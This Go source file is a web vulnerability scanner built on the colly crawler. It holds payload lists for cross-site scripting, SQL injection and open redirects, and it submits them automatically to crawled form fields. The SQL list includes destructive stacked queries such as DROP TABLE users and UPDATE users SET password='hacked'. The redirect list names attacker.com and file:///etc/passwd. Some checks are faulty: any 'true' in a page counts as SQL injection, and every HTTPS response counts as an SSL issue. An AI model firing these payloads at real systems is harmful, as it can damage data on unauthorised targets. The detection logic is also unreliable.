package main

import (
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/gocolly/colly"
)

// XSSScanner checks for Cross-Site Scripting vulnerabilities
type XSSScanner struct{}

func (s *XSSScanner) Scan(startURL string, c *colly.Collector) []Vulnerability {
	var vulns []Vulnerability
	
	// Enhanced XSS payloads
	xssPayloads := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"javascript:alert(1)",
		"'><script>alert(1)</script>",
		"<svg/onload=alert(1)>",
		"<body onload=alert(1)>",
		"<input onfocus=alert(1) autofocus>",
		"<select onmouseover=alert(1)>",
		"<iframe src=javascript:alert(1)>",
		"<details open ontoggle=alert(1)>",
		"<marquee onstart=alert(1)>",
		"<div onmouseover=alert(1) style=width:100%;height:100%;position:fixed;top:0;left:0;>",
		"<svg><script>alert&#40;1&#41;</script></svg>",
		"<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
		"<svg><animate attributeName=onload values=alert(1)>",
		"<svg><set attributeName=onload to=alert(1)>",
		"<svg><animate attributeName=onload values=alert(1)>",
		"<svg><animate attributeName=onload values=alert(1)>",
		"<svg><animate attributeName=onload values=alert(1)>",
		"<svg><animate attributeName=onload values=alert(1)>",
	}

	// DOM-based XSS detection
	c.OnHTML("script", func(e *colly.HTMLElement) {
		scriptContent := e.Text
		domXSSPatterns := []string{
			"document\\.write\\(",
			"innerHTML\\s*=",
			"outerHTML\\s*=",
			"eval\\(",
			"setTimeout\\(",
			"setInterval\\(",
			"location\\.href\\s*=",
			"location\\.assign\\(",
			"location\\.replace\\(",
		}

		for _, pattern := range domXSSPatterns {
			if matched, _ := regexp.MatchString(pattern, scriptContent); matched {
				vulns = append(vulns, Vulnerability{
					URL:         e.Request.URL.String(),
					Type:        "DOM-based XSS",
					Severity:    "High",
					Description: "Potential DOM-based XSS vulnerability found in script",
					Evidence:    "Pattern matched: " + pattern,
				})
			}
		}
	})

	// Enhanced form testing
	c.OnHTML("form", func(e *colly.HTMLElement) {
		formURL := e.Request.AbsoluteURL(e.Attr("action"))
		method := strings.ToUpper(e.Attr("method"))
		if method == "" {
			method = "GET"
		}

		// Test each input field
		e.ForEach("input, textarea, select", func(_ int, input *colly.HTMLElement) {
			inputName := input.Attr("name")
			if inputName == "" {
				return
			}

			// Test with different encodings
			for _, payload := range xssPayloads {
				encodedPayload := url.QueryEscape(payload)
				if method == "POST" {
					data := map[string]string{
						inputName: payload,
					}
					c.Post(formURL, data)
					// Try with encoded payload
					data[inputName] = encodedPayload
					c.Post(formURL, data)
				} else {
					u, _ := url.Parse(formURL)
					q := u.Query()
					q.Set(inputName, payload)
					u.RawQuery = q.Encode()
					c.Visit(u.String())
					// Try with encoded payload
					q.Set(inputName, encodedPayload)
					u.RawQuery = q.Encode()
					c.Visit(u.String())
				}
			}
		})
	})

	// Enhanced response checking
	c.OnResponse(func(r *colly.Response) {
		body := string(r.Body)
		contentType := r.Headers.Get("Content-Type")
		
		// Only check for XSS in HTML responses
		if strings.Contains(contentType, "text/html") {
			for _, payload := range xssPayloads {
				// Check for unencoded payload
				if strings.Contains(body, payload) {
					vulns = append(vulns, Vulnerability{
						URL:         r.Request.URL.String(),
						Type:        "Reflected XSS",
						Severity:    "High",
						Description: "Reflected Cross-Site Scripting vulnerability found",
						Evidence:    "Payload reflected in response: " + payload,
					})
				}
				
				// Check for encoded payload
				encodedPayload := url.QueryEscape(payload)
				if strings.Contains(body, encodedPayload) {
					vulns = append(vulns, Vulnerability{
						URL:         r.Request.URL.String(),
						Type:        "Reflected XSS (Encoded)",
						Severity:    "High",
						Description: "Reflected Cross-Site Scripting vulnerability found with encoded payload",
						Evidence:    "Encoded payload reflected in response: " + encodedPayload,
					})
				}
			}
		}
	})

	return vulns
}

// SQLInjectionScanner checks for SQL Injection vulnerabilities
type SQLInjectionScanner struct{}

func (s *SQLInjectionScanner) Scan(startURL string, c *colly.Collector) []Vulnerability {
	var vulns []Vulnerability

	// Enhanced SQL Injection payloads
	sqlPayloads := []string{
		// Basic SQL Injection
		"' OR '1'='1",
		"' OR 1=1--",
		"1' ORDER BY 1--",
		"1' UNION SELECT NULL--",
		// Time-based SQL Injection
		"' WAITFOR DELAY '0:0:5'--",
		"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
		"' AND (SELECT COUNT(*) FROM tabname) > 0--",
		// Error-based SQL Injection
		"' AND 1=CONVERT(int,(SELECT @@version))--",
		"' AND 1=CONVERT(int,(SELECT db_name()))--",
		"' AND 1=CONVERT(int,(SELECT user_name()))--",
		// Union-based SQL Injection
		"' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
		"' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
		"' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
		// Boolean-based SQL Injection
		"' AND 1=1--",
		"' AND 1=2--",
		"' AND 'x'='x",
		"' AND 'x'='y",
		// Stacked Queries
		"'; DROP TABLE users--",
		"'; DELETE FROM users--",
		"'; UPDATE users SET password='hacked'--",
		// NoSQL Injection
		"{\"$gt\": \"\"}",
		"{\"$ne\": null}",
		"{\"$where\": \"1==1\"}",
		// MongoDB Injection
		"{\"$regex\": \".*\"}",
		"{\"$exists\": true}",
		"{\"$type\": 1}",
	}

	// Enhanced SQL error patterns
	sqlErrorPatterns := []string{
		// MySQL Errors
		"SQL syntax.*MySQL",
		"Warning.*mysql_",
		"valid MySQL result",
		"check the manual that corresponds to your (MySQL|MariaDB) server version",
		"MySqlClient\\.",
		"com\\.mysql\\.jdbc",
		"MySQLSyntaxErrorException",
		"Unknown column '[^']+' in 'field list'",
		"Table '[^']+' doesn't exist",
		// PostgreSQL Errors
		"PostgreSQL.*ERROR",
		"ERROR: syntax error at or near",
		"ERROR: relation \"[^']+\" does not exist",
		"ERROR: column \"[^']+\" does not exist",
		// Oracle Errors
		"ORA-[0-9][0-9][0-9][0-9]",
		"Oracle error",
		"SQL command not properly ended",
		"ORA-00921: unexpected end of SQL command",
		"ORA-00933: SQL command not properly ended",
		// SQL Server Errors
		"Microsoft SQL Server",
		"SQLServer JDBC Driver",
		"ODBC SQL Server Driver",
		"Warning.*(mssql|sqlsrv)_",
		"\\[SQL Server\\]",
		"System\\.Data\\.SqlClient\\.",
		"Unclosed quotation mark after the character string",
		// SQLite Errors
		"SQLite/JDBCDriver",
		"SQLite\\.Exception",
		"System\\.Data\\.SQLite\\.SQLiteException",
		// General SQL Errors
		"SQL syntax.*",
		"Syntax error or access violation",
		"Unexpected end of SQL command",
		"Warning: mysql_",
		"valid MySQL result",
		"check the manual that corresponds to your (MySQL|MariaDB) server version",
		"Unknown column '[^']+' in 'field list'",
		"MySqlClient\\.",
		"com\\.mysql\\.jdbc",
		"Zend_Db_",
		"PGSQL_",
		"ODBC SQL Server Driver",
		"Microsoft OLE DB Provider for SQL Server",
		"Unclosed quotation mark after the character string",
		"Microsoft SQL Server",
	}

	// Enhanced form testing
	c.OnHTML("form", func(e *colly.HTMLElement) {
		formURL := e.Request.AbsoluteURL(e.Attr("action"))
		method := strings.ToUpper(e.Attr("method"))
		if method == "" {
			method = "GET"
		}

		e.ForEach("input, textarea, select", func(_ int, input *colly.HTMLElement) {
			inputName := input.Attr("name")
			if inputName == "" {
				return
			}

			// Test with different encodings and techniques
			for _, payload := range sqlPayloads {
				// Test with original payload
				if method == "POST" {
					data := map[string]string{
						inputName: payload,
					}
					c.Post(formURL, data)
				} else {
					u, _ := url.Parse(formURL)
					q := u.Query()
					q.Set(inputName, payload)
					u.RawQuery = q.Encode()
					c.Visit(u.String())
				}

				// Test with URL encoded payload
				encodedPayload := url.QueryEscape(payload)
				if method == "POST" {
					data := map[string]string{
						inputName: encodedPayload,
					}
					c.Post(formURL, data)
				} else {
					u, _ := url.Parse(formURL)
					q := u.Query()
					q.Set(inputName, encodedPayload)
					u.RawQuery = q.Encode()
					c.Visit(u.String())
				}

				// Test with double encoded payload
				doubleEncodedPayload := url.QueryEscape(encodedPayload)
				if method == "POST" {
					data := map[string]string{
						inputName: doubleEncodedPayload,
					}
					c.Post(formURL, data)
				} else {
					u, _ := url.Parse(formURL)
					q := u.Query()
					q.Set(inputName, doubleEncodedPayload)
					u.RawQuery = q.Encode()
					c.Visit(u.String())
				}
			}
		})
	})

	// Enhanced response checking
	c.OnResponse(func(r *colly.Response) {
		body := string(r.Body)
		contentType := r.Headers.Get("Content-Type")
		
		// Check for SQL errors in response
		for _, pattern := range sqlErrorPatterns {
			if matched, _ := regexp.MatchString(pattern, body); matched {
				vulns = append(vulns, Vulnerability{
					URL:         r.Request.URL.String(),
					Type:        "SQL Injection",
					Severity:    "Critical",
					Description: "SQL Injection vulnerability found",
					Evidence:    "SQL error message detected: " + pattern,
				})
			}
		}

		// Check for timing-based SQL injection
		if r.Request.Duration > 5*time.Second {
			vulns = append(vulns, Vulnerability{
				URL:         r.Request.URL.String(),
				Type:        "Time-based SQL Injection",
				Severity:    "High",
				Description: "Potential time-based SQL injection vulnerability",
				Evidence:    "Response time exceeded 5 seconds",
			})
		}

		// Check for boolean-based SQL injection
		if strings.Contains(body, "true") || strings.Contains(body, "false") {
			vulns = append(vulns, Vulnerability{
				URL:         r.Request.URL.String(),
				Type:        "Boolean-based SQL Injection",
				Severity:    "High",
				Description: "Potential boolean-based SQL injection vulnerability",
				Evidence:    "Boolean response detected in response body",
			})
		}
	})

	return vulns
}

// OpenRedirectScanner checks for Open Redirect vulnerabilities
type OpenRedirectScanner struct{}

func (s *OpenRedirectScanner) Scan(startURL string, c *colly.Collector) []Vulnerability {
	var vulns []Vulnerability

	// Enhanced Open Redirect payloads
	redirectPayloads := []string{
		// Basic redirects
		"//google.com",
		"//google.com/",
		"//google.com/%2e%2e",
		"//google.com/%2e%2e/",
		"//google.com/%2e%2e%2f",
		"//google.com/%2e%2e%2f/",
		"//google.com/%2f%2e%2e",
		"//google.com/%2f%2e%2e/",
		"//google.com/%2f%2e%2e%2f",
		"//google.com/%2f%2e%2e%2f/",
		// Protocol-relative URLs
		"//attacker.com",
		"//attacker.com/",
		"//attacker.com/%2e%2e",
		"//attacker.com/%2e%2e/",
		// Encoded characters
		"%2f%2fgoogle.com",
		"%2f%2fgoogle.com%2f",
		"%2f%2fgoogle.com%2f%2e%2e",
		"%2f%2fgoogle.com%2f%2e%2e%2f",
		// Double encoding
		"%252f%252fgoogle.com",
		"%252f%252fgoogle.com%252f",
		"%252f%252fgoogle.com%252f%252e%252e",
		"%252f%252fgoogle.com%252f%252e%252e%252f",
		// Mixed encoding
		"%2f%2fgoogle.com%2f%252e%252e",
		"%2f%2fgoogle.com%2f%252e%252e%2f",
		// JavaScript protocol
		"javascript:alert(1)",
		"javascript:alert(document.domain)",
		"javascript:void(0)",
		// Data protocol
		"data:text/html,<script>alert(1)</script>",
		"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
		// Meta refresh
		"<meta http-equiv=\"refresh\" content=\"0;url=//google.com\">",
		// HTML5 history API
		"javascript:history.pushState({},'','//google.com')",
		// Relative paths
		"./google.com",
		"../google.com",
		"../../google.com",
		// Protocol handlers
		"file:///etc/passwd",
		"ftp://attacker.com",
		"telnet://attacker.com",
		// Unicode characters
		"//google.com\u2028",
		"//google.com\u2029",
		// Null bytes
		"//google.com%00",
		"//google.com%00/",
	}

	// Enhanced redirect parameter detection
	redirectParams := []string{
		"redirect",
		"url",
		"next",
		"return",
		"returnTo",
		"return_to",
		"returnUrl",
		"return_url",
		"redir",
		"redirect_uri",
		"redirect_url",
		"redirectUrl",
		"redirectTo",
		"redirect_to",
		"rurl",
		"destination",
		"dest",
		"target",
		"targetUrl",
		"target_url",
		"targetUri",
		"target_uri",
		"u",
		"link",
		"href",
		"src",
		"file",
		"page",
		"view",
		"path",
		"folder",
		"dir",
		"directory",
		"location",
		"loc",
		"goto",
		"go",
		"returnPath",
		"return_path",
		"returnUrl",
		"return_url",
		"returnUri",
		"return_uri",
		"callback",
		"callback_url",
		"callbackUrl",
		"callback_uri",
		"callbackUri",
	}

	// Check all links and forms
	c.OnHTML("a[href], form[action], link[href], script[src], img[src], iframe[src]", func(e *colly.HTMLElement) {
		// Get the attribute value based on the element type
		var attrValue string
		switch e.Name {
		case "a", "link":
			attrValue = e.Attr("href")
		case "form":
			attrValue = e.Attr("action")
		case "script", "img", "iframe":
			attrValue = e.Attr("src")
		}

		if attrValue == "" {
			return
		}

		// Check if the attribute contains any redirect parameters
		for _, param := range redirectParams {
			if strings.Contains(strings.ToLower(attrValue), param) {
				// Test with all payloads
				for _, payload := range redirectPayloads {
					redirectURL := e.Request.AbsoluteURL(attrValue)
					u, err := url.Parse(redirectURL)
					if err != nil {
						continue
					}

					// Test with different parameter positions
					q := u.Query()
					
					// Test as query parameter
					q.Set(param, payload)
					u.RawQuery = q.Encode()
					c.Visit(u.String())

					// Test as path parameter
					pathParts := strings.Split(u.Path, "/")
					for i := range pathParts {
						if strings.Contains(strings.ToLower(pathParts[i]), param) {
							pathParts[i] = payload
							u.Path = strings.Join(pathParts, "/")
							c.Visit(u.String())
						}
					}

					// Test as fragment
					u.Fragment = payload
					c.Visit(u.String())
				}
			}
		}
	})

	// Enhanced response checking
	c.OnResponse(func(r *colly.Response) {
		// Check Location header
		location := r.Headers.Get("Location")
		if location != "" {
			for _, payload := range redirectPayloads {
				if strings.Contains(location, payload) {
					vulns = append(vulns, Vulnerability{
						URL:         r.Request.URL.String(),
						Type:        "Open Redirect",
						Severity:    "Medium",
						Description: "Open Redirect vulnerability found",
						Evidence:    "Redirect to: " + location,
					})
				}
			}
		}

		// Check Refresh header
		refresh := r.Headers.Get("Refresh")
		if refresh != "" {
			for _, payload := range redirectPayloads {
				if strings.Contains(refresh, payload) {
					vulns = append(vulns, Vulnerability{
						URL:         r.Request.URL.String(),
						Type:        "Open Redirect (Meta Refresh)",
						Severity:    "Medium",
						Description: "Open Redirect vulnerability found in Refresh header",
						Evidence:    "Refresh header: " + refresh,
					})
				}
			}
		}

		// Check response body for meta refresh
		body := string(r.Body)
		if strings.Contains(body, "<meta http-equiv=\"refresh\"") {
			for _, payload := range redirectPayloads {
				if strings.Contains(body, payload) {
					vulns = append(vulns, Vulnerability{
						URL:         r.Request.URL.String(),
						Type:        "Open Redirect (Meta Refresh)",
						Severity:    "Medium",
						Description: "Open Redirect vulnerability found in meta refresh tag",
						Evidence:    "Meta refresh tag found with redirect to: " + payload,
					})
				}
			}
		}
	})

	return vulns
}

// HeaderSecurityScanner checks for security-related HTTP headers
type HeaderSecurityScanner struct{}

func (s *HeaderSecurityScanner) Scan(startURL string, c *colly.Collector) []Vulnerability {
	var vulns []Vulnerability

	c.OnResponse(func(r *colly.Response) {
		headers := r.Headers
		
		// Check for missing security headers
		securityHeaders := map[string]string{
			"X-Frame-Options":           "Missing X-Frame-Options header (clickjacking protection)",
			"X-Content-Type-Options":    "Missing X-Content-Type-Options header (MIME-sniffing protection)",
			"X-XSS-Protection":          "Missing X-XSS-Protection header (XSS protection)",
			"Strict-Transport-Security": "Missing HSTS header (HTTPS enforcement)",
			"Content-Security-Policy":   "Missing Content-Security-Policy header (XSS protection)",
		}

		for header, description := range securityHeaders {
			if headers.Get(header) == "" {
				vulns = append(vulns, Vulnerability{
					URL:         r.Request.URL.String(),
					Type:        "Missing Security Header",
					Severity:    "Low",
					Description: description,
					Evidence:    "Header not present in response",
				})
			}
		}

		// Check for insecure cookie settings
		cookies := headers.Values("Set-Cookie")
		for _, cookie := range cookies {
			if !strings.Contains(cookie, "Secure") {
				vulns = append(vulns, Vulnerability{
					URL:         r.Request.URL.String(),
					Type:        "Insecure Cookie",
					Severity:    "Medium",
					Description: "Cookie set without Secure flag",
					Evidence:    "Cookie: " + cookie,
				})
			}
			if !strings.Contains(cookie, "HttpOnly") {
				vulns = append(vulns, Vulnerability{
					URL:         r.Request.URL.String(),
					Type:        "Insecure Cookie",
					Severity:    "Medium",
					Description: "Cookie set without HttpOnly flag",
					Evidence:    "Cookie: " + cookie,
				})
			}
		}
	})

	return vulns
}

// SSLScanner checks for SSL/TLS configuration issues
type SSLScanner struct{}

func (s *SSLScanner) Scan(startURL string, c *colly.Collector) []Vulnerability {
	var vulns []Vulnerability

	c.OnResponse(func(r *colly.Response) {
		if r.Request.URL.Scheme == "https" {
			// Check TLS version
			if r.Request.URL.Scheme == "https" {
				vulns = append(vulns, Vulnerability{
					URL:         r.Request.URL.String(),
					Type:        "SSL/TLS",
					Severity:    "High",
					Description: "SSL/TLS configuration check",
					Evidence:    "HTTPS connection established",
				})
			}
		}
	})

	return vulns
} 